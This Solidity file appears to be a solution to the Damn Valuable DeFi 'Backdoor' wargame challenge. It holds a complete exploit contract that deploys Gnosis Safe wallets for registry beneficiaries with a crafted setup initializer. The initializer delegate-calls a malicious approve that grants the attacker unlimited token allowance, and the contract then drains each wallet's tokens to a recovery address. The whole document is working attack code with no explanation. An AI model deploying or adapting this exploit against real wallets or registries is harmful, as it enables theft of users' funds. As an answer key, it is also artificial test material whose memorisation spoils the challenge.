// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";

contract MaliciousApprove {
  function approve(DamnValuableToken token, address spender) external {
      token.approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
  address recovery;
  DamnValuableToken token;
  MaliciousApprove fakeApprove;

  constructor(address _recovery, DamnValuableToken _token) {
    recovery = _recovery;
    token = _token;
  }

  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
    for (uint256 i = 0; i < 4; i++) {
        fakeApprove = new MaliciousApprove();
            address[] memory users = new address[](1);
            users[0] = _users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                users,
                1,
                fakeApprove,
                abi.encodeWithSelector(MaliciousApprove.approve.selector, token, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
                _singletonCopy,
                initializer,
                i,
                IProxyCreationCallback(_walletRegistry)
            );

            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
        }
    }

    function approve(address spender) external {
      token.approve(spender, 10e18);
    }

  
}